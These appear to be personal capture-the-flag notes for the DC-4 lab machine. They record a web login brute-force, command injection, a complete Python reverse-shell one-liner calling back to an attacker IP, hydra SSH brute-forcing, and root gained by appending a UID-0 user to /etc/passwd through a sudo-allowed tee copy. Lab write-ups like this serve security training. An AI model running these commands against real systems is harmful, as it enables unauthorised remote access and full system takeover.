----------------------------------------------------
# Author -> Shubham Rannpise
----------------------------------------------------
# DC-4
# 19/2/2023

----------------------------------------------------
# brutforce port 80
----------------------------------------------------
user admin
pass happy
----------------------------------------------------
# nmap result
----------------------------------------------------
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.4p1 Debian 10+deb9u6 (protocol 2.0)
80/tcp open  http    nginx 1.15.10

----------------------------------------------------
# exploitaion
----------------------------------------------------
got cmd in webapp via buirp
got rev shell

python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.49.107",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'


----------------------------------------------------
# privEsc
----------------------------------------------------
got oldpass.back in jim home directory
lets brutforce with hydra to ssh
users can be 
 charles  jim  sam
[22][ssh] host: 192.168.43.160   login: jim   password: jibril04


->cat/var/mail/jim
user charles
Password is:  ^xHhA&hvim0y

as charles
->sudo -l
(root) NOPASSWD: /usr/bin/teehee

->teehee --help
Usage: teehee [OPTION]... [FILE]...
Copy standard input to each FILE, and also to standard output.

  -a, --append              append to the given FILEs, do not overwrite
  -i, --ignore-interrupts   ignore interrupt signals
  -p                        diagnose errors writing to non pipes
      --output-error[=MODE]   set behavior on write error.  See MODE below
      --help     display this help and exit
      --version  output version information and exit

MODE determines behavior with write errors on the outputs:
  'warn'         diagnose errors writing to any output
  'warn-nopipe'  diagnose errors writing to any output not a pipe
  'exit'         exit on error writing to any output
  'exit-nopipe'  exit on error writing to any output not a pipe
The default MODE for the -p option is 'warn-nopipe'.
The default operation when --output-error is not specified, is to
exit immediately on error writing to a pipe, and diagnose errors
writing to non pipe outputs.

GNU coreutils online help: <http://www.gnu.org/software/coreutils/>
Full documentation at: <http://www.gnu.org/software/coreutils/tee>
or available locally via: info '(coreutils) tee invocation'

->sudo teehee -a /etc/passwd
shub1:$1$wBWi6EWv$LbWS.z3TjFdrNY4uvzr4e1:0:0:root:/root:/bin/bash

su shub1
shub

got a root